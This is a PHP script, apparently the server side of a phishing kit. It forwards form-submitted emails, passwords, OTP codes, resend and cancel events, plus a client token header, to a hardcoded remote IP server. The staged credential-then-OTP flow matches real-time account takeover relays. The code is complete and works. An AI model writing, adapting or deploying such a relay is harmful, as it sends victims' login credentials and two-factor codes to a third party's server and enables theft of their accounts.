<?php


function senEvent($nodeAppUrl ,$jsonData) {
    $ch = curl_init($nodeAppUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

$LINK = "http://103.183.114.254:5000";
// $LINK = "http://localhost:5000";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Nhận dữ liệu POST từ Ajax
    $type = $_POST["type"];
    $jsonData = json_encode($_POST);
    if ($type == 'email') {
    $nodeAppUrl = $LINK . '/email';
    $maxRetries = 2; // Số lần thử tối đa
    $retryCount = 0;

    do {
        $ch = curl_init($nodeAppUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

        $response = curl_exec($ch);
        $errorNo = curl_errno($ch);
        curl_close($ch);

        if ($errorNo == CURLE_OPERATION_TIMEDOUT) {
            $retryCount++;
        } else {
            // Thoát vòng lặp nếu không phải lỗi timeout
            break;
        }
    } while ($retryCount < $maxRetries);

    if ($retryCount >= $maxRetries) {
        echo "Yêu cầu thất bại sau nhiều lần thử.";
    } else {
        echo json_encode($response);
    }
} else if($type == 'password') {
        $nodeAppUrl = $LINK . '/password';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token'] // Thêm các header tùy chỉnh ở đây
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'otp') {
        $nodeAppUrl = $LINK . '/otp-code';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token']
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'resend') {
        $nodeAppUrl = $LINK . '/resend-code';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token']
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'cancel') {
        $nodeAppUrl = $LINK . '/cancel';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token'] // Thêm các header tùy chỉnh ở đây
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    }
} else {
    // Trường hợp không phải POST request
    echo "Invalid request method.";
}

?>
